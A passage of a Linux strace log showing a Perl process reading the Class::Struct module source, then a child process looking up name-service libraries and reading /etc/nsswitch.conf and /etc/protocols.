undef;$cmt\\n\";\n        }\n        elsif( $type =~ /^\\w+(?:::\\w+)*$/ ){\n            $out .= \"    if (defined(\\$init{\'$name\'}))", 4096) = 4096
6692  07:15:04.993232 brk(0x82de000)    = 0x82de000
6692  07:15:04.993607 read(10, " {\\n\";\n           $out .= \"       if (ref \\$init{\'$name\'} eq \'HASH\')\\n\";\n            $out .= \"            { \\$r->$elem = $type->new(\\%{\\$init{\'$name\'}}) } $cmt\\n\";\n           $out .= \"       elsif (UNIVERSAL::isa(\\$init{\'$name\'}, \'$type\'))\\n\";\n            $out .= \"            { \\$r->$elem = \\$init{\'$name\'} } $cmt\\n\";\n            $out .= \"       else { croak \'Initializer for $name must be hash or $type reference\' }\\n\";\n            $out .= \"    }\\n\";\n            $classes{$name} = $type;\n            $got_class = 1;\n        }\n        else{\n            croak \"\'$type\' is not a valid struct element type\";\n        }\n        $idx += 2;\n    }\n    $out .= \"    bless \\$r, \\$class;\\n  }\\n\";\n\n    # Create accessor methods.\n\n    my( $pre, $pst, $sel );\n    $cnt = 0;\n    foreach $name (@methods){\n        if ( do { no strict \'refs\'; defined &{$class . \"::$name\"} } ) {\n            warnings::warnif(\"function \'$name\' already defined, overrides struct accessor method\");\n        }\n        else {\n            $pre = $pst = $cmt = $sel = \'\';\n            if( defined $refs{$name} ){\n                $pre = \"\\\\(\";\n                $pst = \")\";\n                $cmt = \" # returns ref\";\n            }\n            $out .= \"  sub $name {$cmt\\n    my \\$r = shift;\\n\";\n            if( $base_type eq \'ARRAY\' ){\n                $elem = \"[$cnt]\";\n                ++$cnt;\n            }\n            elsif( $base_type eq \'HASH\' ){\n                $elem = \"{\'${class}::$name\'}\";\n            }\n            if( defined $arrays{$name} ){\n                $out .= \"    my \\$i;\\n\";\n                $out .= \"    \\@_ ? (\\$i = shift) : return \\$r->$elem;\\n\"; \n                $out .= \"    if (ref(\\$i) eq \'ARRAY\' && !\\@_) { \\$r->$elem = \\$i; return \\$r }\\n\";\n                $sel = \"->[\\$i]\";\n            }\n            elsif( defined $hashes{$name} ){\n                $out .= \"    my \\$i;\\n\";\n                $out .= \"    \\@_ ? (\\$i = shift) : return \\$r->$elem;\\n\";\n                $out .= \"    if (ref(\\$i) eq \'HASH\' && !\\@_) { \\$r->$elem = \\$i; return \\$r }\\n\";\n                $sel = \"->{\\$i}\";\n            }\n            elsif( defined $classes{$name} ){\n                if ( $CHECK_CLASS_MEMBERSHIP ) {\n                    $out .= \"    croak \'$name argument is wrong class\' if \\@_ && ! UNIVERSAL::isa(\\$_[0], \'$classes{$name}\');\\n\";\n                }\n            }\n            $out .= \"    croak \'Too many args to $name\' if \\@_ > 1;\\n\";\n            $out .= \"    \\@_ ? ($pre\\$r->$elem$sel = shift$pst) : $pre\\$r->$elem$sel$pst;\\n\";\n            $out .= \"  }\\n\";\n        }\n    }\n    $out .= \"}\\n1;\\n\";\n\n    print $out if $print;\n    my $result = eval $out;\n    carp $@ if $@;\n}\n\nsub _usage_error {\n    confess \"struct usage error\";\n}\n\nsub _subclass_error {\n    croak \'struct class cannot be a subclass (@ISA not allowed)\';\n}\n\n1; # for require\n\n\n__END__\n\n=head1 NAME\n\nClass::Struct - declare struct-like datatypes as Perl classes\n\n=head1 SYNOPSIS\n\n    use Class::Struct;\n            # declare struct, based on array:\n    struct( CLASS_NAME => [ ELEMENT_NAME => ELEMENT_TYPE, ... ]);\n            # declare struct, based on hash:\n    struct( CLASS_NAME => { ELEMENT_NAME => ELEMENT_TYPE, ... });\n\n    package CLASS_NAME;\n    use Class::Struct;\n            # declare struct, based on array, implicit class name:\n    struct( ELEMENT_NAME => ELEMENT_TYPE, ... );\n\n    # Declare struct at compile time\n    use Class::Struct CLASS_NAME => [ ELEMENT_NAME => ELEMENT_TYPE, ... ];\n    use Class::Struct CLASS_NAME => { ELEMENT_NAME => ELEMENT_TYPE, ... };\n\n    # declare struct at compile time, based on array, implicit class name:\n    package CLASS_NAME;\n    use Class::Struct ELEMENT_NAME => ELEMENT_TYPE, ... ;\n\n    package Myobj;\n    use Class::Struct;\n            # declare struct with four types of elements:\n    struct( s => \'$\', a => \'@\', h => \'%\', c => \'My_Other_Class\' );\n\n    $obj = new Myobj;               # constructor\n\n                                    # scalar type accessor:\n    $element_value = $obj->s;           # element value\n    $obj->s(\'new value\');               # assign to element\n\n                             ", 4096) = 4096
6692  07:15:04.994220 _llseek(10, 6916, [6916], SEEK_SET) = 0
6692  07:15:04.994238 _llseek(10, 0, [6916], SEEK_CUR) = 0
6692  07:15:04.994249 close(10)         = 0
6692  07:15:04.994427 _llseek(8, 1334, [1334], SEEK_SET) = 0
6692  07:15:04.994443 _llseek(8, 0, [1334], SEEK_CUR) = 0
6692  07:15:04.994453 close(8)          = 0
6692  07:15:04.995122 brk(0x82ff000)    = 0x82ff000
6692  07:15:04.995268 _llseek(6, 2689, [2689], SEEK_SET) = 0
6692  07:15:04.995284 _llseek(6, 0, [2689], SEEK_CUR) = 0
6692  07:15:04.995294 close(6)          = 0
6692  07:15:04.995449 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7e13908) = 6693
6693  07:15:05.039754 getppid()         = 6692
6693  07:15:05.040314 open("/etc/nsswitch.conf", O_RDONLY) = 6
6693  07:15:05.040341 fstat64(6, {st_mode=S_IFREG|0644, st_size=475, ...}) = 0
6693  07:15:05.040362 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fd9000
6693  07:15:05.040376 read(6, "# /etc/nsswitch.conf\n#\n# Example configuration of GNU Name Service Switch functionality.\n# If you have the `glibc-doc-reference\' and `info\' packages installed, try:\n# `info libc \"Name Service Switch\"\' for information about this file.\n\npasswd:         compat\ngroup:          compat\nshadow:         compat\n\nhosts:          files dns\nnetworks:       files\n\nprotocols:      db files\nservices:       db files\nethers:         db files\nrpc:            db files\n\nnetgroup:       nis\n", 4096) = 475
6693  07:15:05.040436 read(6, "", 4096) = 0
6693  07:15:05.040447 close(6)          = 0
6693  07:15:05.040457 munmap(0xb7fd9000, 4096) = 0
6693  07:15:05.040484 open("/etc/ld.so.cache", O_RDONLY) = 6
6693  07:15:05.040498 fstat64(6, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
6693  07:15:05.040515 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 6, 0) = 0xb7de0000
6693  07:15:05.040526 close(6)          = 0
6693  07:15:05.040537 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
6693  07:15:05.040556 open("/lib/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6693  07:15:05.040570 stat64("/lib/tls/i686/sse2/cmov", 0xbfe7930c) = -1 ENOENT (No such file or directory)
6693  07:15:05.040585 open("/lib/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6693  07:15:05.040598 stat64("/lib/tls/i686/sse2", 0xbfe7930c) = -1 ENOENT (No such file or directory)
6693  07:15:05.040610 open("/lib/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6693  07:15:05.040623 stat64("/lib/tls/i686/cmov", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
6693  07:15:05.040671 open("/lib/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6693  07:15:05.040685 stat64("/lib/tls/i686", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
6693  07:15:05.040720 open("/lib/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6693  07:15:05.040733 stat64("/lib/tls/sse2/cmov", 0xbfe7930c) = -1 ENOENT (No such file or directory)
6693  07:15:05.040744 open("/lib/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6693  07:15:05.040756 stat64("/lib/tls/sse2", 0xbfe7930c) = -1 ENOENT (No such file or directory)
6693  07:15:05.040768 open("/lib/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6693  07:15:05.040780 stat64("/lib/tls/cmov", 0xbfe7930c) = -1 ENOENT (No such file or directory)
6693  07:15:05.040791 open("/lib/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6693  07:15:05.040803 stat64("/lib/tls", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
6693  07:15:05.040820 open("/lib/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6693  07:15:05.040833 stat64("/lib/i686/sse2/cmov", 0xbfe7930c) = -1 ENOENT (No such file or directory)
6693  07:15:05.040844 open("/lib/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6693  07:15:05.040856 stat64("/lib/i686/sse2", 0xbfe7930c) = -1 ENOENT (No such file or directory)
6693  07:15:05.040867 open("/lib/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6693  07:15:05.040879 stat64("/lib/i686/cmov", 0xbfe7930c) = -1 ENOENT (No such file or directory)
6693  07:15:05.040890 open("/lib/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6693  07:15:05.040902 stat64("/lib/i686", 0xbfe7930c) = -1 ENOENT (No such file or directory)
6693  07:15:05.040913 open("/lib/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6693  07:15:05.040926 stat64("/lib/sse2/cmov", 0xbfe7930c) = -1 ENOENT (No such file or directory)
6693  07:15:05.040937 open("/lib/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6693  07:15:05.040948 stat64("/lib/sse2", 0xbfe7930c) = -1 ENOENT (No such file or directory)
6693  07:15:05.040959 open("/lib/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6693  07:15:05.040971 stat64("/lib/cmov", 0xbfe7930c) = -1 ENOENT (No such file or directory)
6693  07:15:05.040986 open("/lib/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6693  07:15:05.040998 stat64("/lib", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
6693  07:15:05.041014 open("/usr/lib/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6693  07:15:05.041028 stat64("/usr/lib/tls/i686/sse2/cmov", 0xbfe7930c) = -1 ENOENT (No such file or directory)
6693  07:15:05.041040 open("/usr/lib/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6693  07:15:05.041053 stat64("/usr/lib/tls/i686/sse2", 0xbfe7930c) = -1 ENOENT (No such file or directory)
6693  07:15:05.041064 open("/usr/lib/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6693  07:15:05.041077 stat64("/usr/lib/tls/i686/cmov", 0xbfe7930c) = -1 ENOENT (No such file or directory)
6693  07:15:05.041089 open("/usr/lib/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6693  07:15:05.041101 stat64("/usr/lib/tls/i686", 0xbfe7930c) = -1 ENOENT (No such file or directory)
6693  07:15:05.041120 open("/usr/lib/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6693  07:15:05.041134 stat64("/usr/lib/tls/sse2/cmov", 0xbfe7930c) = -1 ENOENT (No such file or directory)
6693  07:15:05.041145 open("/usr/lib/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6693  07:15:05.041158 stat64("/usr/lib/tls/sse2", 0xbfe7930c) = -1 ENOENT (No such file or directory)
6693  07:15:05.041169 open("/usr/lib/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6693  07:15:05.041182 stat64("/usr/lib/tls/cmov", 0xbfe7930c) = -1 ENOENT (No such file or directory)
6693  07:15:05.041193 open("/usr/lib/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6693  07:15:05.041205 stat64("/usr/lib/tls", 0xbfe7930c) = -1 ENOENT (No such file or directory)
6693  07:15:05.041216 open("/usr/lib/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6693  07:15:05.041230 stat64("/usr/lib/i686/sse2/cmov", 0xbfe7930c) = -1 ENOENT (No such file or directory)
6693  07:15:05.041242 open("/usr/lib/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6693  07:15:05.041254 stat64("/usr/lib/i686/sse2", 0xbfe7930c) = -1 ENOENT (No such file or directory)
6693  07:15:05.041266 open("/usr/lib/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6693  07:15:05.041279 stat64("/usr/lib/i686/cmov", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
6693  07:15:05.041296 open("/usr/lib/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6693  07:15:05.041309 stat64("/usr/lib/i686", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
6693  07:15:05.041326 open("/usr/lib/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6693  07:15:05.041339 stat64("/usr/lib/sse2/cmov", 0xbfe7930c) = -1 ENOENT (No such file or directory)
6693  07:15:05.041350 open("/usr/lib/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6693  07:15:05.041362 stat64("/usr/lib/sse2", 0xbfe7930c) = -1 ENOENT (No such file or directory)
6693  07:15:05.041373 open("/usr/lib/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6693  07:15:05.041386 stat64("/usr/lib/cmov", 0xbfe7930c) = -1 ENOENT (No such file or directory)
6693  07:15:05.041397 open("/usr/lib/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6693  07:15:05.041408 stat64("/usr/lib", {st_mode=S_IFDIR|0755, st_size=32768, ...}) = 0
6693  07:15:05.041425 open("/lib/i486-linux-gnu/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6693  07:15:05.041439 stat64("/lib/i486-linux-gnu/tls/i686/sse2/cmov", 0xbfe7930c) = -1 ENOENT (No such file or directory)
6693  07:15:05.041452 open("/lib/i486-linux-gnu/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6693  07:15:05.041466 stat64("/lib/i486-linux-gnu/tls/i686/sse2", 0xbfe7930c) = -1 ENOENT (No such file or directory)
6693  07:15:05.041481 open("/lib/i486-linux-gnu/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6693  07:15:05.041495 stat64("/lib/i486-linux-gnu/tls/i686/cmov", 0xbfe7930c) = -1 ENOENT (No such file or directory)
6693  07:15:05.041507 open("/lib/i486-linux-gnu/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6693  07:15:05.041520 stat64("/lib/i486-linux-gnu/tls/i686", 0xbfe7930c) = -1 ENOENT (No such file or directory)
6693  07:15:05.041533 open("/lib/i486-linux-gnu/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6693  07:15:05.041546 stat64("/lib/i486-linux-gnu/tls/sse2/cmov", 0xbfe7930c) = -1 ENOENT (No such file or directory)
6693  07:15:05.041559 open("/lib/i486-linux-gnu/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6693  07:15:05.041572 stat64("/lib/i486-linux-gnu/tls/sse2", 0xbfe7930c) = -1 ENOENT (No such file or directory)
6693  07:15:05.041584 open("/lib/i486-linux-gnu/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6693  07:15:05.041597 stat64("/lib/i486-linux-gnu/tls/cmov", 0xbfe7930c) = -1 ENOENT (No such file or directory)
6693  07:15:05.041639 open("/lib/i486-linux-gnu/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6693  07:15:05.041669 stat64("/lib/i486-linux-gnu/tls", 0xbfe7930c) = -1 ENOENT (No such file or directory)
6693  07:15:05.041681 open("/lib/i486-linux-gnu/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6693  07:15:05.041695 stat64("/lib/i486-linux-gnu/i686/sse2/cmov", 0xbfe7930c) = -1 ENOENT (No such file or directory)
6693  07:15:05.041708 open("/lib/i486-linux-gnu/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6693  07:15:05.041721 stat64("/lib/i486-linux-gnu/i686/sse2", 0xbfe7930c) = -1 ENOENT (No such file or directory)
6693  07:15:05.041734 open("/lib/i486-linux-gnu/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6693  07:15:05.041747 stat64("/lib/i486-linux-gnu/i686/cmov", 0xbfe7930c) = -1 ENOENT (No such file or directory)
6693  07:15:05.041759 open("/lib/i486-linux-gnu/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6693  07:15:05.041772 stat64("/lib/i486-linux-gnu/i686", 0xbfe7930c) = -1 ENOENT (No such file or directory)
6693  07:15:05.041784 open("/lib/i486-linux-gnu/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6693  07:15:05.041797 stat64("/lib/i486-linux-gnu/sse2/cmov", 0xbfe7930c) = -1 ENOENT (No such file or directory)
6693  07:15:05.041809 open("/lib/i486-linux-gnu/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6693  07:15:05.041822 stat64("/lib/i486-linux-gnu/sse2", 0xbfe7930c) = -1 ENOENT (No such file or directory)
6693  07:15:05.041834 open("/lib/i486-linux-gnu/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6693  07:15:05.041847 stat64("/lib/i486-linux-gnu/cmov", 0xbfe7930c) = -1 ENOENT (No such file or directory)
6693  07:15:05.041859 open("/lib/i486-linux-gnu/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6693  07:15:05.041872 stat64("/lib/i486-linux-gnu", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
6693  07:15:05.041890 open("/usr/lib/i486-linux-gnu/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6693  07:15:05.041904 stat64("/usr/lib/i486-linux-gnu/tls/i686/sse2/cmov", 0xbfe7930c) = -1 ENOENT (No such file or directory)
6693  07:15:05.041917 open("/usr/lib/i486-linux-gnu/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6693  07:15:05.041931 stat64("/usr/lib/i486-linux-gnu/tls/i686/sse2", 0xbfe7930c) = -1 ENOENT (No such file or directory)
6693  07:15:05.041944 open("/usr/lib/i486-linux-gnu/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6693  07:15:05.041957 stat64("/usr/lib/i486-linux-gnu/tls/i686/cmov", 0xbfe7930c) = -1 ENOENT (No such file or directory)
6693  07:15:05.041973 open("/usr/lib/i486-linux-gnu/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6693  07:15:05.041987 stat64("/usr/lib/i486-linux-gnu/tls/i686", 0xbfe7930c) = -1 ENOENT (No such file or directory)
6693  07:15:05.041999 open("/usr/lib/i486-linux-gnu/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6693  07:15:05.042013 stat64("/usr/lib/i486-linux-gnu/tls/sse2/cmov", 0xbfe7930c) = -1 ENOENT (No such file or directory)
6693  07:15:05.042026 open("/usr/lib/i486-linux-gnu/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6693  07:15:05.042039 stat64("/usr/lib/i486-linux-gnu/tls/sse2", 0xbfe7930c) = -1 ENOENT (No such file or directory)
6693  07:15:05.042052 open("/usr/lib/i486-linux-gnu/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6693  07:15:05.042065 stat64("/usr/lib/i486-linux-gnu/tls/cmov", 0xbfe7930c) = -1 ENOENT (No such file or directory)
6693  07:15:05.042077 open("/usr/lib/i486-linux-gnu/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6693  07:15:05.042090 stat64("/usr/lib/i486-linux-gnu/tls", 0xbfe7930c) = -1 ENOENT (No such file or directory)
6693  07:15:05.042102 open("/usr/lib/i486-linux-gnu/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6693  07:15:05.042116 stat64("/usr/lib/i486-linux-gnu/i686/sse2/cmov", 0xbfe7930c) = -1 ENOENT (No such file or directory)
6693  07:15:05.042153 open("/usr/lib/i486-linux-gnu/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6693  07:15:05.042169 stat64("/usr/lib/i486-linux-gnu/i686/sse2", 0xbfe7930c) = -1 ENOENT (No such file or directory)
6693  07:15:05.042196 open("/usr/lib/i486-linux-gnu/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6693  07:15:05.042210 stat64("/usr/lib/i486-linux-gnu/i686/cmov", 0xbfe7930c) = -1 ENOENT (No such file or directory)
6693  07:15:05.042222 open("/usr/lib/i486-linux-gnu/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6693  07:15:05.042235 stat64("/usr/lib/i486-linux-gnu/i686", 0xbfe7930c) = -1 ENOENT (No such file or directory)
6693  07:15:05.042248 open("/usr/lib/i486-linux-gnu/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6693  07:15:05.042261 stat64("/usr/lib/i486-linux-gnu/sse2/cmov", 0xbfe7930c) = -1 ENOENT (No such file or directory)
6693  07:15:05.042274 open("/usr/lib/i486-linux-gnu/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6693  07:15:05.042287 stat64("/usr/lib/i486-linux-gnu/sse2", 0xbfe7930c) = -1 ENOENT (No such file or directory)
6693  07:15:05.042299 open("/usr/lib/i486-linux-gnu/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6693  07:15:05.042312 stat64("/usr/lib/i486-linux-gnu/cmov", 0xbfe7930c) = -1 ENOENT (No such file or directory)
6693  07:15:05.042325 open("/usr/lib/i486-linux-gnu/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
6693  07:15:05.042338 stat64("/usr/lib/i486-linux-gnu", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
6693  07:15:05.042359 munmap(0xb7de0000, 29913) = 0
6693  07:15:05.042380 open("/etc/ld.so.cache", O_RDONLY) = 6
6693  07:15:05.042393 fstat64(6, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
6693  07:15:05.042410 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 6, 0) = 0xb7de0000
6693  07:15:05.042420 close(6)          = 0
6693  07:15:05.042431 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
6693  07:15:05.042446 open("/lib/tls/i686/cmov/libnss_files.so.2", O_RDONLY) = 6
6693  07:15:05.042461 read(6, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\340\30\0\0004\0\0\0\254\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\330\206\0\0\330\206\0\0\330\206\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\240\213\0\0\240\213\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0\314\1\0\0\260\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0k\0\0\0.\0\0\0\20\0\0\0\t\0\0\0\"F\340\24\240\240\245\1\31\10\200\20\203\6\212\10\0\0\222@]\1(\nx\10 \"\220\200\20,\5\1\204\4)!\0224\0\24\0\31\0\0\2\2\210@\0\200@0\210\201@@\200\0B\0\6\300.\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0002\0\0\0003\0\0\0\0\0\0\0004\0\0\0\0\0\0\0005\0\0\0007\0\0\0008\0\0\0\0\0\0\0:\0\0\0\0\0\0\0;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
6693  07:15:05.042558 fstat64(6, {st_mode=S_IFREG|0644, st_size=38412, ...}) = 0
6693  07:15:05.042580 mmap2(NULL, 41624, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 6, 0) = 0xb7dd5000
6693  07:15:05.042592 mmap2(0xb7dde000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 6, 0x8) = 0xb7dde000
6693  07:15:05.042610 close(6)          = 0
6693  07:15:05.042661 munmap(0xb7de0000, 29913) = 0
6693  07:15:05.042694 open("/etc/protocols", O_RDONLY|0x80000 /* O_??? */) = 6
6693  07:15:05.042711 fcntl64(6, F_GETFD) = 0x1 (flags FD_CLOEXEC)
6693  07:15:05.042727 fstat64(6, {st_mode=S_IFREG|0644, st_size=2510, ...}) = 0
6693  07:15:05.042744 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7de7000
6693  07:15:05.042755 read(6, "# Internet (IP) protocols\n#\n# Updated from http://www.iana.org/assignments/protocol-numbers and other\n# sources.\n# New protocols will be added on request if they have been officially\n# assigned by IANA and are not historical.\n# If you need a huge list of used numbers please install the nmap package.\n\nip\t0\tIP\t\t# internet protocol, pseudo protocol number\n#hopopt\t0\tHOPOPT\t\t# IPv6 Hop-by-Hop Option [RFC1883]\nicmp\t1\tICMP\t\t# internet control message protocol\nigmp\t2\tIGMP\t\t# Internet Group Management\nggp\t3\tGGP\t\t# gateway-gateway protocol\nipencap\t4\tIP-ENCAP\t# IP encapsulated in IP (officially ``IP\'\')\nst\t5\tST\t\t# ST datagram mode\ntcp\t6\tTCP\t\t# transmission control protocol\negp\t8\tEGP\t\t# exterior gateway protocol\nigp\t9\tIGP\t\t# any private interior gateway (Cisco)\npup\t12\tPUP\t\t# PARC universal packet protocol\nudp\t17\tUDP\t\t# user datagram protocol\nhmp\t20\tHMP\t\t# host monitoring protocol\nxns-idp\t22\tXNS-IDP\t\t# Xerox NS IDP\nrdp\t27\tRDP\t\t# \"reliable datagram\" protocol\niso-tp4\t29\tISO-TP4\t\t# ISO Transport Protocol class 4 [RFC905]\nxtp\t36\tXTP\t\t# Xpress Transfer Protocol\nddp\t37\tDDP\t\t# Datagram Delivery Protocol\nidpr-cmtp 38\tIDPR-CMTP\t# IDPR Control Message Transport\nipv6\t41\tIPv6\t\t# Internet Protocol, version 6\nipv6-route 43\tIPv6-Route\t# Routing Header for IPv6\nipv6-frag 44\tIPv6-Frag\t# Fragment Header for IPv6\nidrp\t45\tIDRP\t\t# Inter-Domain Routing Protocol\nrsvp\t46\tRSVP\t\t# Reservation Protocol\ngre\t47\tGRE\t\t# General Routing Encapsulation\nesp\t50\tIPSEC-ESP\t# Encap Security Payload [RFC2406]\nah\t51\tIPSEC-AH\t# Authentication Header [RFC2402]\nskip\t57\tSKIP\t\t# SKIP\nipv6-icmp 58\tIPv6-ICMP\t# ICMP for IPv6\nipv6-nonxt 59\tIPv6-NoNxt\t# No Next Header for IPv6\nipv6-opts 60\tIPv6-Opts\t# Destination Options for IPv6\nrspf\t73\tRSPF CPHB\t# Radio Shortest Path First (officially CPHB)\nvmtp\t81\tVMTP\t\t# Versatile Message Transport\neigrp\t88\tEIGRP\t\t# Enhanced Interior Routing Protocol (Cisco)\nospf\t89\tOSPFIGP\t\t# Open Shortest Path First IGP\nax.25\t93\tAX.25\t\t# AX.25 frames\nipip\t94\tIPIP\t\t# IP-within-IP Encapsulation Protocol\netherip\t97\tETHERIP\t\t# Ethernet-within-IP Encapsulation [RFC3378]\nencap\t98\tENCAP\t\t# Yet Another IP encapsulation [RFC1241]\n#\t99\t\t\t# any private encryption scheme\npim\t103\tPIM\t\t# Protocol Independent Multicast\nipcomp\t108\tIPCOMP\t\t# IP Payload Compression Protocol\nvrrp\t112\tVRRP\t\t# Virtual Router Redundancy Protocol\nl2tp\t115\tL2TP\t\t# Layer Two Tunneling Protocol [RFC2661]\nisis\t124\tISIS\t\t# IS-IS over IPv4\nsctp\t132\tSCTP\t\t# Stream Control Transmission 